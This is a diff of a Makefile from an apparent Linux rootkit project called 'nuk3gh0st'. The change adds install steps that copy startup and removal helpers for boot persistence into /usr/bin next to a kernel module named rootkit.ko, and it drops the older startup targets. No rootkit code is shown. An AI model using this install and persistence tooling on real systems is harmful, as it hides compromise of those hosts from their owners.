@@ -12,18 +12,16 @@ install:
 	cp rootkit.ko /usr/lib/rootkit.ko
 	cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
 	cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
+	cp startup-nuk3gh0st /usr/bin/startup-nuk3gh0st
+	cp rmstartup-nuk3gh0st /usr/bin/rmstartup-nuk3gh0st
 	chmod +x /usr/bin/load-nuk3gh0st
 	chmod +x /usr/bin/unload-nuk3gh0st
+	chmod +x /usr/bin/startup-nuk3gh0st
+	chmod +x /usr/bin/rmstartup-nuk3gh0st
 uninstall:
 	rm /usr/bin/nuk3gh0st
 	rm /usr/lib/rootkit.ko
 	rm /usr/bin/load-nuk3gh0st
 	rm /usr/bin/unload-nuk3gh0st
-startup:
-	chmod +x startup.sh
-	./startup.sh
-clean-startup:
-	chmod +x clean-startup.sh
-	./clean-startup.sh
 clean:
 	rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
